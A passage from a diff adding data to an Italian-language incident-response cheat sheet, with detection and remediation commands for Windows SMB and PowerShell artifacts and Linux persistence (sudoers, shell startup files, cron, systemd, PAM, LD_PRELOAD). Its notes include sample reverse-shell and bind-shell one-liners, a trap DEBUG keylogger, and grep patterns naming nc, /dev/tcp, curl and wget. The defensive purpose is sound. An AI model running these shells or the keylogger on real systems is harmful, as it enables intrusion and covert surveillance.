+    {t:"Esporta la chiave Run in un file .reg per l'analisi offline, senza alterare il sistema originale.", y:"CMD", c:`reg export "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" backup_run.reg`},
+  ]},
+  { id:'shares', name:'SMB Shares & Remote Access', theory:{
+    paths:[],
+    notes:[
+      "Una condivisione amministrativa (C$, ADMIN$) o una share con permessi Everyone/Full Control è spesso il canale usato per copiare payload su altri host durante un movimento laterale.",
+    ],
+  }, items:[
+    {t:"Tutte le cartelle condivise sulla macchina locale.", y:"CMD", c:`net share`},
+    {t:"Unità di rete mappate e sessioni SMB correnti verso host remoti.", y:"CMD", c:`net use`},
+    {t:"Sessioni SMB in ingresso attualmente attive da host remoti: individua chi si è connesso a questa macchina via rete.", y:"CMD", c:`net session`},
+    {t:"Elenco delle condivisioni disponibili su un host remoto specifico, utile in fase di ricognizione di un movimento laterale.", y:"CMD", c:`net view \\\\<hostname>`},
+    {t:"Tutte le condivisioni SMB configurate sul sistema, tramite cmdlet PowerShell.", y:"PowerShell", c:`Get-SmbShare`},
+    {t:"Sessioni SMB attive verso questo host, con dettagli su utente e indirizzo di provenienza.", y:"PowerShell", c:`Get-SmbSession`},
+    {t:"File attualmente aperti da remoto tramite SMB: utile per capire cosa un attaccante connesso sta effettivamente leggendo o scrivendo.", y:"PowerShell", c:`Get-SmbOpenFile`},
+    {t:"Log delle connessioni RDP in ingresso su questo host: complementare allo storico delle connessioni in uscita salvato nel registro utente.", y:"PowerShell", c:`Get-WinEvent -LogName 'Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational'`},
+    {t:"Elenco dei processi su una macchina remota tramite WMI: utile per un triage rapido multi-host senza installare agenti.", y:"CMD", c:`wmic /node:<target> process list brief`},
+    {t:"Esegue un comando su un host remoto tramite WinRM/PowerShell Remoting: verifica se questa capacità è stata usata dall'attaccante per muoversi lateralmente.", y:"PowerShell", c:`Invoke-Command -ComputerName <target> -ScriptBlock { Get-Process }`},
+  ], remediation:[
+    {t:"Rimuove una condivisione di rete non autorizzata o creata da un attaccante.", y:"CMD", c:`net share <NomeCondivisione> /delete`},
+    {t:"Termina forzatamente una sessione SMB sospetta in ingresso da un host remoto.", y:"PowerShell", c:`Close-SmbSession -SessionId <ID> -Force`},
+    {t:"Chiude un file aperto da remoto tramite SMB, interrompendo l'accesso in corso.", y:"PowerShell", c:`Close-SmbOpenFile -FileId <ID> -Force`},
+  ]},
+  { id:'pshistory', name:'PowerShell Forensics', theory:{
+    paths:[
+      {p:"$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\", d:"posizione dello storico persistente dei comandi PowerShell"},
+      {p:"Microsoft-Windows-PowerShell/Operational", d:"Script Block Logging (4104) e Module Logging (4103)"},
+    ],
+    notes:[],
+  }, items:[
+    {t:"Storico dei comandi digitati nella sessione PowerShell corrente.", y:"PowerShell", c:`Get-History`},
+    {t:"Contenuto del file di storico persistente di PowerShell (PSReadLine): sopravvive alla chiusura della sessione, a differenza di Get-History.", y:"PowerShell", c:`cat (Get-PSReadlineOption).HistorySavePath`},
+    {t:"Percorso della cartella dove PowerShell salva lo storico persistente, utile per una raccolta forense diretta del file.", y:"PowerShell", c:`Get-ChildItem $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine`},
+    {t:"Stesso file di storico raggiungibile da riga di comando, senza aprire una sessione PowerShell.", y:"CMD", c:`dir %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\`},
+    {t:"Eventi di Module Logging (Event ID 4103): registra l'uso dei cmdlet PowerShell, complementare al Script Block Logging.", y:"PowerShell", c:`Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' | Where-Object { $_.Id -eq 4103 }`},
+    {t:"Verifica se lo Script Block Logging è abilitato tramite Group Policy: senza questa impostazione, gli script offuscati non vengono registrati in chiaro.", y:"CMD", c:`reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging"`},
+    {t:"Verifica se la trascrizione delle sessioni PowerShell è abilitata tramite Group Policy.", y:"CMD", c:`reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription"`},
+    {t:"Execution policy di PowerShell su tutti gli scope: utile per capire se un attaccante l'ha abbassata localmente per eseguire script non firmati.", y:"PowerShell", c:`Get-ExecutionPolicy -List`},
+  ]},
+],
+linux: [
+  { id:'sysinfo', name:'System Info', theory:{
+    paths:[
+      {p:"/etc/os-release", d:"nome e versione della distribuzione installata"},
+      {p:"/proc/version", d:"versione del kernel e compilatore usato per il build"},
+    ],
+    notes:[
+      "Non è una superficie di persistenza: usa questi comandi per orientarti rapidamente sull'host e sincronizzare correttamente la timeline forense prima di procedere con l'analisi.",
+    ],
+  }, items:[
+    {t:"Hostname, distribuzione, kernel e architettura in un solo comando: il primo da lanciare per orientarsi sull'host.", y:"Bash", c:`hostnamectl`},
+    {t:"Versione del kernel e architettura del sistema, utile per verificare la presenza di CVE kernel-specific.", y:"Bash", c:`uname -a`},
+    {t:"Distribuzione e versione del sistema operativo installato.", y:"Bash", c:`cat /etc/os-release`},
+    {t:"Interfacce di rete e tabella di routing in un solo output.", y:"Bash", c:`ip a; ip route`},
+    {t:"Ultimi login sul sistema con IP di provenienza: utile per individuare accessi da indirizzi non attesi.", y:"Bash", c:`last -a | head -20`},
+    {t:"Utenti attualmente collegati al sistema, con terminale e orario di login.", y:"Bash", c:`who -a`},
+    {t:"Tempo di attività del sistema, utile per correlare riavvii sospetti con l'orario di un incidente.", y:"Bash", c:`uptime`},
+    {t:"Ora e timezone di sistema: essenziale per correlare correttamente i timestamp dei log raccolti sull'host.", y:"Bash", c:`date; timedatectl`},
+  ]},
+  { id:'users', name:'Utenti, Gruppi & Sudo', theory:{
+    paths:[
+      {p:"/etc/passwd", d:"user:x:UID:GID:descrizione:home:shell"},
+      {p:"/etc/shadow", d:"hash password e scadenze (leggibile solo da root)"},
+      {p:"/etc/group", d:"definizione dei gruppi e relativi membri"},
+      {p:"/etc/gshadow", d:"password di gruppo e amministratori del gruppo"},
+      {p:"/etc/sudoers", d:"regole sudo — flag NOPASSWD, ALL"},
+      {p:"/etc/sudoers.d/", d:"regole drop-in, incluse automaticamente da sudoers"},
+    ],
+    notes:[
+      {warn:true, text:"Red flags: UID 0 diverso da root · shell interattiva su account che dovrebbero essere di servizio · home directory in /tmp o /var/www · regole NOPASSWD:ALL nei drop-in."},
+    ],
+  }, items:[
+    {t:"Account con UID 0 oltre a root: un secondo utente con privilegi root equivalenti è un forte indicatore di persistenza (T1136).", y:"Bash", c:`awk -F: '$3==0{print}' /etc/passwd`},
+    {t:"Utenti con shell interattiva (bash/sh/zsh) tra gli account con UID elevato: individua account creati di recente o trasformati per il login.", y:"Bash", c:`awk -F: '$7~/bash|sh|zsh/ && $3>=1000' /etc/passwd`},
+    {t:"Utenti con home directory in percorsi anomali come /tmp, /var/www o /dev: posizione atipica spesso associata ad account creati da un attaccante.", y:"Bash", c:`awk -F: '$6~/\\/tmp|\\/var\\/www|\\/dev/' /etc/passwd`},
+    {t:"Regole NOPASSWD nel file sudoers e nei suoi drop-in: permesso di eseguire comandi come root senza password, spesso aggiunto per garantire persistenza rapida.", y:"Bash", c:`grep -r "NOPASSWD\\|ALL.*ALL" /etc/sudoers /etc/sudoers.d/`},
+    {t:"Membri dei gruppi con privilegi elevati o di escalation (sudo, wheel, adm, docker, lxd).", y:"Bash", c:`for g in sudo wheel adm docker lxd; do getent group $g; done`},
+    {t:"File di account (passwd/shadow/sudoers) modificati più recentemente dei file di sistema base.", y:"Bash", c:`find /etc -maxdepth 1 \\( -name passwd -o -name shadow -o -name sudoers \\) -newer /etc/hostname 2>/dev/null | xargs ls -lah`},
+    {t:"Vista formattata e leggibile di tutti gli account presenti su /etc/passwd, colonna per colonna.", y:"Bash", c:`cat /etc/passwd | column -t -s :`},
+    {t:"Elenco di tutti gli account creati manualmente (UID ≥ 1000) con relativa shell assegnata.", y:"Bash", c:`awk -F: '($3 >= 1000) {print $1,$3,$7}' /etc/passwd`},
+    {t:"Privilegi sudo effettivamente concessi all'utente corrente.", y:"Bash", c:`sudo -l`},
+    {t:"Verifica rapida dell'appartenenza ai gruppi privilegiati sudo/wheel/root.", y:"Bash", c:`grep -E '^sudo|^wheel|^root' /etc/group`},
+  ], remediation:[
+    {t:"Blocca immediatamente un account sospetto senza eliminarlo, preservando le prove per l'analisi forense.", y:"Bash", c:`passwd -l <utente> && usermod -L <utente>`},
+    {t:"Fa scadere immediatamente l'account, impedendone il login a partire dal prossimo tentativo.", y:"Bash", c:`usermod -e 1 <utente>`},
+    {t:"Forza il cambio password al prossimo login, utile quando si vuole mantenere l'account attivo sotto osservazione.", y:"Bash", c:`chage -d 0 <utente>`},
+    {t:"Rimuove l'utente dal gruppo sudo, revocando i privilegi di amministrazione.", y:"Bash", c:`gpasswd -d <utente> sudo`},
+    {t:"Elimina l'utente e la sua home directory: da eseguire solo dopo aver effettuato una copia forense della home.", y:"Bash", c:`userdel -r <utente>`},
+    {t:"Rimuove un drop-in sudoers malevolo e valida la sintassi del file principale prima di lasciare il sistema.", y:"Bash", c:`rm /etc/sudoers.d/99-backdoor && visudo -c`},
+    {t:"Verifica la coerenza dei database di account e gruppi dopo le modifiche.", y:"Bash", c:`pwck -r && grpck -r`},
+  ]},
+  { id:'shellstartup', name:'Shell Startup Files', theory:{
+    paths:[
+      {p:"~/.bash_profile", d:"shell di login — eseguito per primo (poi .bash_login/.profile)"},
+      {p:"~/.bashrc", d:"shell interattiva non di login (richiamato da .bash_profile)"},
+      {p:"~/.bash_logout", d:"eseguito all'uscita — spesso usato per beaconing o pulizia tracce"},
+      {p:"~/.profile", d:"fallback per sh/dash e per il login"},
+      {p:"~/.zshrc / ~/.zprofile", d:"equivalenti per la shell Zsh"},
+      {p:"/etc/profile", d:"eseguito per primo, per tutti gli utenti"},
+      {p:"/etc/profile.d/*.sh", d:"richiamato da /etc/profile — bersaglio classico"},
+      {p:"/etc/bash.bashrc", d:"shell non di login interattiva (Debian)"},
+    ],
+    notes:[
+      "Ordine di esecuzione tipico al login SSH: /etc/profile → /etc/profile.d/* → ~/.bash_profile → ~/.bashrc.",
+      "Esempio di backdoor reverse shell tipica in un file di startup: (nohup bash -i > /dev/tcp/IP/PORT 0<&1 2>&1 &)",
+      {warn:true, text:"Esempio di keylogger via trap DEBUG usato da un attaccante: trap 'echo \"$(whoami): $BASH_COMMAND\" >> /tmp/.log' DEBUG — registra ogni comando eseguito nella shell."},
+    ],
+  }, items:[
+    {t:"Pattern di reverse shell o download nei file di startup di tutti gli utenti: tecnica di persistenza molto comune ed economica per un attaccante.", y:"Bash", c:`grep -rE "nohup|/dev/tcp|bash -i|nc |curl|wget|base64" /home/*/.{bashrc,bash_profile,profile} /root/.bashrc /etc/profile.d/`},
+    {t:"Stessa ricerca estesa esplicitamente a tutti i file di profilo, incluso chmod tra i pattern sospetti.", y:"Bash", c:`grep -rE '(bash -i|nc |nohup|/dev/tcp|curl|wget|chmod)' ~/.bashrc ~/.bash_profile ~/.profile /etc/profile /etc/profile.d/ 2>/dev/null`},
+    {t:"PATH hijacking: verifica se un file di startup ridefinisce la variabile PATH per far eseguire un binario malevolo al posto di quello legittimo.", y:"Bash", c:`grep -rE "^export PATH|^PATH=" /home/*/.{bashrc,profile} /etc/profile.d/`},
+    {t:"Valore corrente di PATH e PROMPT_COMMAND nella sessione attiva: PROMPT_COMMAND può eseguire codice prima di ogni prompt.", y:"Bash", c:`echo $PATH; echo "$PROMPT_COMMAND"`},
+    {t:"Abuso di PROMPT_COMMAND, trap DEBUG o alias: tecniche che eseguono codice ad ogni comando digitato in shell, senza che l'utente se ne accorga.", y:"Bash", c:`grep -rE "PROMPT_COMMAND|trap.*DEBUG|^alias " /home/*/.bashrc /etc/profile.d/`},
+    {t:"Elenco di tutti i trap attivi nella sessione corrente: un trap su DEBUG esegue codice prima di ogni singolo comando, tecnica da keylogger.", y:"Bash", c:`trap -p; trap -p DEBUG`},
+    {t:"Alias sospetti e override di comandi comuni (ls, cat, ssh, sudo): un attaccante può ridefinirli per eseguire codice mascherato da comando legittimo.", y:"Bash", c:`echo "[Aliases]"; alias; echo; echo "[Overrides]"; for cmd in ls cat ssh sudo; do type -a $cmd; echo; done`},
+    {t:"File di startup modificati più recentemente dei file di sistema base.", y:"Bash", c:`find /home /root /etc/profile.d -newer /etc/passwd \\( -name ".*rc" -o -name ".*profile" -o -name "*.sh" \\) 2>/dev/null | xargs ls -lah`},
+    {t:"Variante focalizzata sui soli script .sh in /etc/profile.d/ modificati dopo /etc/passwd.", y:"Bash", c:`find /home /root /etc/profile.d -name "*.sh" -newer /etc/passwd -ls`},
+    {t:"Timestamp di modifica dei principali file di profilo dell'utente: una data recente e isolata è spesso il primo indizio di manomissione.", y:"Bash", c:`stat ~/.bashrc ~/.bash_profile ~/.profile`},
+  ], remediation:[
+    {t:"Individua in quale file è definito un alias o un hook malevolo, prima di rimuoverlo.", y:"Bash", c:`grep -R "alias ssh=" /etc /root /home 2>/dev/null`},
+    {t:"Rimuove la riga malevola (alias, trap o payload) direttamente da file, senza dover apire un editor.", y:"Bash", c:`sed -i '/alias ssh=/d' ~/.bashrc\nsed -i '/trap .*DEBUG/d' ~/.bashrc\nsed -i '/nohup.*\\/dev\\/tcp/d' ~/.bashrc`},
+    {t:"Annulla l'hook nella sessione corrente senza attendere un nuovo login.", y:"Bash", c:`trap - DEBUG && unalias ssh 2>/dev/null`},
+    {t:"Verifica che la pulizia sia efficace e ricarica una shell pulita.", y:"Bash", c:`source ~/.bashrc && type ssh && exec bash`},
+    {t:"Rimuove uno script drop-in malevolo inserito in /etc/profile.d/.", y:"Bash", c:`rm /etc/profile.d/malicious.sh`},
+  ]},
+  { id:'process', name:'Processes', theory:{
+    paths:[
+      {p:"/proc/<PID>/exe", d:"link simbolico al binario in esecuzione — risulta rotto se il file è stato cancellato dal disco"},
+      {p:"/proc/<PID>/cmdline", d:"command line completa del processo, separata da byte NUL"},
+      {p:"/proc/<PID>/fd/", d:"file descriptor aperti, incluse copie di file già cancellati"},
+    ],
+    notes:[],
+  }, items:[
+    {t:"Albero completo dei processi con utente, CPU e memoria: prima vista d'insieme sui processi attivi.", y:"Bash", c:`ps auxf`},
+    {t:"Top 20 processi per consumo CPU con Parent PID e comando completo.", y:"Bash", c:`ps -eo pid,ppid,user,cmd --sort=-%cpu | head -20`},
+    {t:"Processi che eseguono binari già cancellati dal disco: tecnica evasiva comune per non lasciare traccia dell'eseguibile originale.", y:"Bash", c:`ls -la /proc/*/exe 2>/dev/null | grep deleted`},
+    {t:"File e socket aperti da un processo specifico, identificato tramite PID.", y:"Bash", c:`lsof -p <PID>`},
+    {t:"Command line completa di ogni processo attivo, letta direttamente da /proc: utile quando ps non mostra l'intero comando.", y:"Bash", c:`for p in /proc/[0-9]*; do echo "== $p =="; cat $p/cmdline 2>/dev/null | tr '\\0' ' '; echo; done`},
+    {t:"Albero dei processi con PID, utile per individuare parent anomali (es. un servizio di rete che genera una shell).", y:"Bash", c:`pstree -p`},
+  ], remediation:[
+    {t:"Termina un processo sospetto identificato tramite PID.", y:"Bash", c:`kill -9 <PID>`},
+    {t:"Termina tutte le istanze di un processo per nome, utile se il malware ne genera più copie.", y:"Bash", c:`pkill -9 -f "<nome-processo>"`},
+  ]},
+  { id:'network', name:'Network Connections', theory:{
+    paths:[
+      {p:"/etc/hosts", d:"redirect statici di dominio verso un IP"},
+      {p:"ss / netstat", d:"stato delle connessioni TCP/UDP con PID del processo owner"},
+    ],
+    notes:[
+      "Bind shell: nc -lvnp 9001 -e /bin/bash — Reverse shell: bash -i >& /dev/tcp/IP/PORT 0>&1",
+    ],
+  }, items:[
+    {t:"Connessioni TCP/UDP attive con PID e nome del processo owner: equivalente Linux del comando Windows per connessioni stabilite con relativo processo.", y:"Bash", c:`ss -tunap`},
+    {t:"Porte TCP in ascolto, escludendo i servizi noti (sshd, nginx, apache): evidenzia più rapidamente un listener non autorizzato.", y:"Bash", c:`ss -tlnp; ss -tlnp | grep -v "sshd\\|nginx\\|apache"`},
+    {t:"Connessioni di rete attive, alternativa a ss se non disponibile sulla distribuzione.", y:"Bash", c:`netstat -tunap`},
+    {t:"Tutte le connessioni in stato established, per individuare canali in uscita verso un possibile C2 o reverse shell.", y:"Bash", c:`ss -tnp state established; netstat -tnp 2>/dev/null`},
+    {t:"Processi con pattern tipici di reverse o bind shell (nc, ncat, bash -i, /dev/tcp, socat).", y:"Bash", c:`ps aux | grep -E '(nc |ncat|bash -i|/dev/tcp|socat)'`},
+    {t:"Regole firewall attualmente attive.", y:"Bash", c:`iptables -L -n -v`},
+    {t:"Tabella ARP/neighbor locale per individuare host sospetti sulla rete.", y:"Bash", c:`ip neigh`},
+    {t:"Tutti i socket di rete aperti, raggruppati per processo.", y:"Bash", c:`lsof -i`},
+    {t:"File descriptor di rete non standard per processo, escludendo listener e servizi noti: utile per individuare connessioni insolite aperte da un processo generico.", y:"Bash", c:`lsof -i -n -P | grep -v "LISTEN\\|established" | grep -v "sshd\\|nginx"`},
+    {t:"Voci statiche in /etc/hosts: controllare eventuali redirect malevoli di domini legittimi verso IP di un attaccante.", y:"Bash", c:`cat /etc/hosts`},
+  ], remediation:[
+    {t:"Chiude a livello kernel una connessione specifica verso un IP e una porta sospetti, senza attendere il timeout applicativo.", y:"Bash", c:`ss -K dst <IP> dport = <PORTA>`},
+    {t:"Blocca tutto il traffico verso/da un IP sospetto tramite iptables.", y:"Bash", c:`iptables -I INPUT 1 -s <IP> -j DROP\niptables -I OUTPUT 1 -d <IP> -j DROP`},
+    {t:"Stesso blocco tramite nftables, firewall predefinito sulle distribuzioni più recenti.", y:"Bash", c:`nft add rule inet filter input ip saddr <IP> drop\nnft add rule inet filter output ip daddr <IP> drop`},
+    {t:"Blocco permanente e persistente al riavvio tramite firewalld.", y:"Bash", c:`firewall-cmd --permanent --add-rich-rule='rule family="ipv4" source address="<IP>" drop'\nfirewall-cmd --reload`},
+    {t:"Termina il processo responsabile della connessione oppure, come ultima risorsa dopo la raccolta forense, arresta l'host.", y:"Bash", c:`kill -9 <PID>   # oppure: pkill -f <nome>  /  killall <nome>\n# ultima risorsa, dopo la raccolta forense:\nshutdown -h now`},
+  ]},
+  { id:'cron', name:'Cron & At', theory:{
+    paths:[
+      {p:"/var/spool/cron/crontabs/", d:"crontab dei singoli utenti (Debian)"},
+      {p:"/etc/crontab", d:"cron di sistema con colonna utente aggiuntiva"},
+      {p:"/etc/cron.d/", d:"file cron drop-in"},
+      {p:"/etc/cron.{hourly,daily,weekly,monthly}/", d:"script eseguiti a intervalli predefiniti"},
+      {p:"/var/spool/at/", d:"job una tantum pianificati con at"},
+      {p:"/var/spool/cron/atjobs/", d:"posizione alternativa di storage dei job at"},
+      {p:"/var/spool/cron/atspool/", d:"dettagli di esecuzione dei task at"},
+      {p:"/etc/anacrontab", d:"anacron — esegue i job persi durante lo shutdown"},
+    ],
+    notes:[
+      "Sintassi cron: minuto ora giorno-mese mese giorno-settimana utente comando. Riferimento rapido: crontab.guru",
+    ],
+  }, items:[
+    {t:"Cron job configurati per l'utente specificato.", y:"Bash", c:`crontab -l -u <utente>`},
+    {t:"Cron job di tutti gli utenti del sistema in un solo comando.", y:"Bash", c:`for u in $(cut -f1 -d: /etc/passwd); do ct=$(crontab -l -u $u 2>/dev/null | grep -v "^#"); [ -n "$ct" ] && echo "=== $u ===" && echo "$ct"; done`},
+    {t:"Cron di sistema: /etc/crontab e le directory cron.d/cron.daily/cron.hourly.", y:"Bash", c:`cat /etc/crontab; ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/`},
+    {t:"File cron (di sistema e spool) modificati negli ultimi 7 giorni.", y:"Bash", c:`find /etc/cron* /var/spool/cron -type f -mtime -7 -ls`},
+    {t:"Voci cron con percorsi o pattern sospetti (staging in /tmp, download inline).", y:"Bash", c:`grep -rE "/tmp|/dev/shm|base64|wget|curl|nc " /etc/crontab /etc/cron.d/ /var/spool/cron/`},
+    {t:"Variante mirata a pattern tipici di reverse shell nei file cron (bash -i, nohup, /dev/tcp).", y:"Bash", c:`grep -rE '(bash -i|nc |wget|curl|/dev/tcp|nohup)' /etc/cron* /var/spool/cron/ 2>/dev/null`},
+    {t:"Contenuto grezzo delle crontab utente salvate su disco: da confrontare con l'output di crontab -l per individuare discrepanze.", y:"Bash", c:`ls -la /var/spool/cron/crontabs/ 2>/dev/null || ls -la /var/spool/cron/ 2>/dev/null`},
+    {t:"Job pianificati con at, tecnica di esecuzione singola ritardata spesso trascurata rispetto a cron.", y:"Bash", c:`atq 2>/dev/null; for i in $(atq | awk '{print $1}'); do at -c $i; done`},
+    {t:"Verifica che il demone atd sia effettivamente attivo, oltre ai job in coda.", y:"Bash", c:`atq; systemctl status atd`},
+  ], remediation:[
+    {t:"Effettua un backup della crontab dell'utente prima di modificarla.", y:"Bash", c:`crontab -l -u <utente> > /tmp/backup_cron_<utente>.txt`},
+    {t:"Rimuove un singolo job malevolo mantenendo gli altri job legittimi dell'utente.", y:"Bash", c:`crontab -l -u <utente> | grep -v 'pattern_malevolo' | crontab -u <utente> -`},
+    {t:"Rimuove tutta la crontab dell'utente, se compromessa integralmente.", y:"Bash", c:`crontab -r -u <utente>`},
+    {t:"Rimuove un file drop-in malevolo da /etc/cron.d/.", y:"Bash", c:`rm /etc/cron.d/<file-malevolo>`},
+    {t:"Rimuove un job at pianificato in modo malevolo, identificato tramite il suo numero di job.", y:"Bash", c:`atrm <numero-job>`},
+  ]},
+  { id:'systemd', name:'Systemd & Init', theory:{
+    paths:[
+      {p:"/etc/systemd/system/", d:"definito dall'amministratore — priorità massima"},
+      {p:"/run/systemd/system/", d:"runtime — svuotato ad ogni riavvio"},
+      {p:"/usr/lib/systemd/system/", d:"installato dai pacchetti di sistema"},
+      {p:"/etc/systemd/system/X.service.d/", d:"override drop-in — tecnica silenziosa e poco monitorata"},
+      {p:"multi-user.target.wants/", d:"symlink di abilitazione all'avvio"},
+      {p:"~/.config/systemd/user/", d:"unit a livello utente, eseguite al login"},
+      {p:"/etc/init.d/", d:"wrapper di compatibilità SysV"},
+      {p:"/etc/rc.local", d:"eseguito a fine boot; richiede rc-local.service abilitato"},
+      {p:"/etc/systemd/system-generators/", d:"generator personalizzati — rischio massimo, eseguiti prima di auditd"},
+      {p:"/run/systemd/system-generators/", d:"generator a runtime"},
+      {p:"/lib/systemd/system-generators/", d:"generator installati dalla distribuzione"},
+      {p:"/run/systemd/generator.early/", d:"output dei generator — priorità massima, può mascherare sysmon/auditbeat"},
+    ],
+    notes:[
+      "Attacco via override: creare /etc/systemd/system/nginx.service sovrascrive silenziosamente la unit legittima in /lib/systemd/system/, per la precedenza di /etc su /lib.",
+      {warn:true, text:"I generator vengono eseguiti in fase di boot PRIMA che sysmon/auditd partano: la loro attività non lascia traccia nei log, sono individuabili solo ispezionando le directory su disco."},
+    ],
+  }, items:[
+    {t:"Tutte le unit systemd abilitate all'avvio automatico.", y:"Bash", c:`systemctl list-unit-files --state=enabled`},
+    {t:"Elenco di tutti gli unit file con relativo stato di abilitazione, in formato tabellare filtrato.", y:"Bash", c:`systemctl list-unit-files --type=service | grep -v "^$\\|UNIT FILE"`},
+    {t:"Servizi systemd attualmente in esecuzione.", y:"Bash", c:`systemctl list-units --type=service --state=running`},
+    {t:"Unit create dinamicamente da un generator invece che da un file .service statico: sospette se inattese.", y:"Bash", c:`systemctl list-unit-files | grep generated`},
+    {t:"Ordine completo di lookup delle directory delle unit systemd, utile per capire quale file ha davvero la precedenza in caso di override.", y:"Bash", c:`systemd-analyze unit-paths`},
+    {t:"Timer systemd attivi: alternativa moderna a cron spesso trascurata durante un'analisi di persistenza.", y:"Bash", c:`systemctl list-timers --all`},
+    {t:"Contenuto effettivo di una unit, inclusi eventuali drop-in di override: più affidabile della sola lettura del file .service.", y:"Bash", c:`systemctl cat <nome-servizio>`},
+    {t:"Unit che eseguono da percorsi temporanei o sospetti nel proprio ExecStart.", y:"Bash", c:`grep -rE "ExecStart.*(/tmp|/dev/shm|/var/tmp)" /etc/systemd/system/`},
+    {t:"Variante più ampia del controllo precedente, che include anche pattern di reverse shell nel comando ExecStart.", y:"Bash", c:`grep -rE '(ExecStart.*(/tmp|/dev/shm|/var/tmp|bash -i|nc |wget|curl))' /etc/systemd/ /run/systemd/ 2>/dev/null`},
+    {t:"Unit file modificate più recentemente rispetto ai file di sistema base: possibile indicatore di manomissione.", y:"Bash", c:`find /etc/systemd /usr/lib/systemd -name "*.service" -o -name "*.timer" | xargs ls -lt | head -20`},
+    {t:"File di servizio creati o modificati negli ultimi 7 giorni che contengono una direttiva ExecStart.", y:"Bash", c:`find /etc/systemd/system /run/systemd/system -name "*.service" -mtime -7 -exec grep -l "ExecStart" {} \\;`},
+    {t:"File di configurazione drop-in presenti sul sistema.", y:"Bash", c:`find /etc/systemd/system -name "*.conf" 2>/dev/null`},
+    {t:"Journal relativo a una unit specifica, per ricostruirne lo storico di esecuzione.", y:"Bash", c:`journalctl -u <nome-servizio> --since "7 days ago"`},
+    {t:"Elenco di tutti i generator presenti sul sistema: eseguono codice prima ancora dell'avvio degli strumenti di audit.", y:"Bash", c:`find /etc/systemd/system-generators /lib/systemd/system-generators -type f -ls`},
+    {t:"Contenuto delle directory di output dei generator, dove compaiono le unit generate dinamicamente al boot.", y:"Bash", c:`ls -la /run/systemd/generator.early/ /run/systemd/generator/ /run/systemd/generator.late/`},
+    {t:"Elenco degli script legacy in init.d e di quelli modificati negli ultimi 7 giorni.", y:"Bash", c:`ls -lah /etc/init.d/; find /etc/init.d -type f -mtime -7`},
+    {t:"Symlink nelle directory rc*.d: un attaccante usa numeri alti (S9x) per garantire l'esecuzione tardiva del proprio script.", y:"Bash", c:`ls -lah /etc/rc*.d/; ls /etc/rc*.d/S9*`},
+    {t:"Contenuto di rc.local e stato del relativo servizio: verifica che non sia eseguibile se non dovrebbe esserlo.", y:"Bash", c:`cat /etc/rc.local; ls -l /etc/rc.local; systemctl status rc-local`},
+    {t:"Evidenza nel syslog dell'effettiva esecuzione di rc.local al boot.", y:"Bash", c:`cat /var/log/syslog | egrep "rc-local.service|/etc/rc.local Compatibility"`},
+    {t:"Pattern di reverse shell all'interno degli script legacy in init.d.", y:"Bash", c:`grep -rE '(bash -i|nc |wget|curl|chmod)' /etc/init.d/ 2>/dev/null`},
+  ], remediation:[
+    {t:"Ferma, disabilita e rimuove una unit malevola.", y:"Bash", c:`systemctl stop <svc> && systemctl disable <svc>\nrm /etc/systemd/system/<svc>.service`},
+    {t:"Rimuove un override drop-in malevolo associato a una unit legittima.", y:"Bash", c:`rm -rf /etc/systemd/system/<svc>.service.d/`},
+    {t:"Ricarica la configurazione systemd e azzera lo stato di errore dopo le modifiche.", y:"Bash", c:`systemctl daemon-reload && systemctl reset-failed`},
+    {t:"Rimuove direttamente il symlink di abilitazione, se la unit continua ad avviarsi.", y:"Bash", c:`rm /etc/systemd/system/multi-user.target.wants/<svc>.service`},
+    {t:"Rimuove una riga malevola aggiunta a rc.local.", y:"Bash", c:`sed -i '/comando_malevolo/d' /etc/rc.local`},
+    {t:"Disabilita un servizio legacy SysV (Debian/RHEL).", y:"Bash", c:`update-rc.d <svc> disable   # oppure: chkconfig <svc> off`},
+    {t:"Maschera completamente un servizio, impedendo anche l'avvio manuale accidentale durante il triage.", y:"Bash", c:`systemctl mask <nome-servizio>`},
+  ]},
+  { id:'pam', name:'PAM', theory:{
+    paths:[
+      {p:"/etc/pam.d/", d:"stack PAM per singolo servizio (sshd, sudo, su, login)"},
+      {p:"/lib/x86_64-linux-gnu/security/", d:"moduli PAM .so installati (Debian/Ubuntu)"},
+      {p:"/lib64/security/", d:"percorso equivalente su RHEL/CentOS"},
+    ],
+    notes:[],
+  }, items:[
+    {t:"Presenza di pam_exec, pam_python o pam_script nelle configurazioni PAM: eseguono comandi arbitrari ad ogni autenticazione (T1556.003).", y:"Bash", c:`grep -rE "pam_exec|pam_python|pam_script" /etc/pam.d/`},
+    {t:"Moduli PAM presenti sul filesystem ma non appartenenti a nessun pacchetto installato: possibile modulo malevolo aggiunto manualmente.", y:"Bash", c:`for so in $(find /lib/x86_64-linux-gnu/security -name "*.so"); do dpkg -S "$so" 2>/dev/null || echo "NON PACCHETTIZZATO: $so"; done`},
+    {t:"File di configurazione PAM modificati più recentemente dei file di sistema base.", y:"Bash", c:`find /etc/pam.d /lib/x86_64-linux-gnu/security -newer /etc/passwd | xargs ls -lah`},
+  ], remediation:[
+    {t:"Rimuove una riga pam_exec malevola da uno stack PAM.", y:"Bash", c:`sed -i '/pam_exec.*beacon/d' /etc/pam.d/sshd`},
+    {t:"Reinstalla i moduli PAM originali dal pacchetto di sistema.", y:"Bash", c:`apt-get install --reinstall libpam-modules   # oppure: yum reinstall pam`},
+  ]},
+  { id:'ldpreload', name:'LD_PRELOAD / ld.so.preload', theory:{
+    paths:[
+      {p:"/etc/ld.so.preload", d:"preload globale — coinvolge OGNI binario del sistema"},
+      {p:"LD_PRELOAD (env)", d:"preload per singolo processo — controllare file di startup e servizi"},
+      {p:"/etc/ld.so.conf.d/", d:"percorsi di ricerca librerie aggiuntivi"},
+    ],
+    notes:[],
+  }, items:[
+    {t:"Contenuto di ld.so.preload e ricerca di eventuali copie del file altrove sul sistema: su un host pulito deve essere vuoto o inesistente.", y:"Bash", c:`cat /etc/ld.so.preload; find /etc -name "ld.so.preload" -ls`},
